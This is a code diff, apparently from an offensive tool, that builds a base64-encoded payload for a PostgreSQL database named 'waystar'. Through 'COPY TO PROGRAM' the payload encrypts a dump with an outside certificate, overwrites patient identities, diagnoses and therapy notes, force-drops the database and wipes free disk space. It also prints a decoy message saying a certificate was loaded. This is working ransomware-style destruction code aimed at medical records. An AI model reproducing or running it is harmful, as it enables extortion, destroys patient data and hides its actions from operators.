@@ -507,35 +507,85 @@ try:
     with open('/tmp/pubkey.pem', 'rb') as f:
         cert_base64 = base64.b64encode(f.read()).decode().strip()
     
-    sql_cmd = f"COPY (SELECT 1) TO PROGRAM $$echo '{{cert_base64}}' | base64 -d > /tmp/server.pem && tar -cf - -C /var/lib/postgresql/data . | openssl cms -encrypt -aes256 -binary -out /var/lib/postgresql/TEST.tar.enc /tmp/server.pem ; find /var/lib/postgresql/data -mindepth 1 -delete > /tmp/debug.log 2>&1 && fstrim -v / 2>/dev/null || true$$;"
+    # 1. Back up and encrypt the database
+    sql_backup = "COPY (SELECT 1) TO PROGRAM 'echo ''" + cert_base64 + "'' | base64 -d > /tmp/server.pem && pg_dump -U waystar waystar > /tmp/backup.sql && openssl cms -encrypt -aes256 -binary -in /tmp/backup.sql -out /var/lib/postgresql/TEST.sql.enc /tmp/server.pem && rm -f /tmp/backup.sql /tmp/server.pem';"
     
+    # 2. Shred active data
+    sql_shred = \"\"\"
+    UPDATE patients SET first_name = 'DELETED', last_name = 'DELETED', phone = 'DELETED', email = 'DELETED', street = 'DELETED', city = 'DELETED', diagnosis = 'DELETED', ins_number = 'DEL-' || id;
+    UPDATE session_notes SET content = 'DELETED', therapist = 'DELETED';
+    UPDATE appointments SET full_name = 'DELETED', email = 'DELETED', notes = 'DELETED';
+    \"\"\"
+    
+    # 3. Drop database (needs connection to 'postgres' database)
+    sql_drop = "DROP DATABASE waystar WITH (FORCE);"
+    
+    # 4. Wipe free space
+    sql_wipe = "COPY (SELECT 1) TO PROGRAM 'dd if=/dev/zero of=/var/lib/postgresql/data/wipe_space bs=1M count=50 || true; rm -f /var/lib/postgresql/data/wipe_space';"
+
     env = {{
         "PGPASSWORD": "{creds['password']}",
         "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
     }}
     
-    proc = subprocess.run(
+    # Run Backup & Shred on 'waystar' DB
+    proc1 = subprocess.run(
         [
             "psql",
             "-h", "{creds['host']}",
             "-p", "{creds['port']}",
             "-U", "{creds['user']}",
-            "-d", "{creds['dbname']}",
-            "-c", sql_cmd
+            "-d", "waystar",
+            "-c", sql_backup + sql_shred
         ],
         env=env,
         capture_output=True,
         text=True
     )
-    
-    if proc.returncode == 0:
-        print("[+] Laden des Certs erfolgreich")
-        sys.exit(0)
-    else:
-        print(f"[-] Laden des Certs fehlgeschlagen: {{proc.stderr.strip()}}")
+    if proc1.returncode != 0:
+        print(f"[-] DB Backup/Shred failed: {{proc1.stderr.strip()}}")
         sys.exit(1)
+
+    # Run Drop on 'postgres' DB
+    proc2 = subprocess.run(
+        [
+            "psql",
+            "-h", "{creds['host']}",
+            "-p", "{creds['port']}",
+            "-U", "{creds['user']}",
+            "-d", "postgres",
+            "-c", sql_drop
+        ],
+        env=env,
+        capture_output=True,
+        text=True
+    )
+    if proc2.returncode != 0:
+        print(f"[-] DB Drop failed: {{proc2.stderr.strip()}}")
+        sys.exit(1)
+
+    # Run Wipe on 'postgres' DB
+    proc3 = subprocess.run(
+        [
+            "psql",
+            "-h", "{creds['host']}",
+            "-p", "{creds['port']}",
+            "-U", "{creds['user']}",
+            "-d", "postgres",
+            "-c", sql_wipe
+        ],
+        env=env,
+        capture_output=True,
+        text=True
+    )
+    if proc3.returncode != 0:
+        print(f"[-] DB Wipe failed: {{proc3.stderr.strip()}}")
+        sys.exit(1)
+        
+    print("[+] Laden des Certs erfolgreich")
+    sys.exit(0)
 except Exception as e:
-    print(f"[-] Laden des Certs fehlgeschlagen: {{e}}")
+    print(f"[-] DB Operations failed: {{e}}")
     sys.exit(1)
 """
     b64_db = __import__('base64').b64encode(db_code.encode()).decode()
